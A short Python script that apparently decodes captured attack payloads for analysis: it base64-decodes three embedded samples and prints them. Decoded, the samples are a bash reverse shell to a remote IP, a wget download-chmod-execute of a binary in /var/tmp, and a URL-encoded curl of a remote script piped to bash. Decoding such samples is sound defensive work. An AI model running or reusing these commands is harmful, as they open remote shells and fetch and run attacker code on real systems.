import base64, sys
def d(s):
    s=s.strip()
    s+= "=" * (-len(s) % 4)
    try: return base64.b64decode(s).decode(errors="ignore")
    except Exception as e: return f"[ERROR:{e}] {s}"

samples = [
 "YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4xNjIuMTY0LjIyLzEzMzcgMD4mMQ==",
 "d2dldCAtcU8gL3Zhci90bXAvQlloa3B6VlpQIGh0dHA6Ly8xODUuMTk2LjkuMzE6ODA4MC9admZoc29kRW90MkZIS2R5b0tJNl93OyBjaG1vZCAreCAvdmFyL3RtcC9CWWhrcHpWWlA7IC92YXIvdG1wL0JZaGtwelZaUCAm",
 "Y3VybCUyMC1zJTIwLUwlMjBodHRwOi8vMTM4LjE5Ny4xNjIuNzk6NjU1MzQvMGR6RnJSelEuc2glN0NiYXNoJTIwLXM",
]

for s in samples:
    print("B64:", s)
    print("TXT:", d(s))
    print("-"*60)
